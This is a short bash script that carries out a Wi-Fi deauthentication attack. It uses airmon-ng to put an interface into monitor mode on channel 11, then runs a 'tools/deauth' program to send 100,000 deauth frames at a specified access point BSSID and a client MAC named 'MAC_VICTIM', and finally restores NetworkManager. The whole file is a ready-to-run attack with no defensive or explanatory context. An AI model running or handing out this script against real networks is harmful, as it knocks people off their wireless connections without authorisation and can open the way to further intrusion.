#!/bin/bash

CHANNEL=11
IF=wlp8s0
BSSID_AP=9A:A7:89:F2:82:25
MAC_VICTIM=e6:22:46:1a:d7:30
N_PACKETS=100000

airmon-ng check kill
airmon-ng start wlp8s0
iw dev wlp8s0mon set channel $CHANNEL

tools/deauth "$IF"mon $BSSID_AP $MAC_VICTIM $N_PACKETS

sudo airmon-ng stop wlp8s0mon && sudo systemctl restart NetworkManager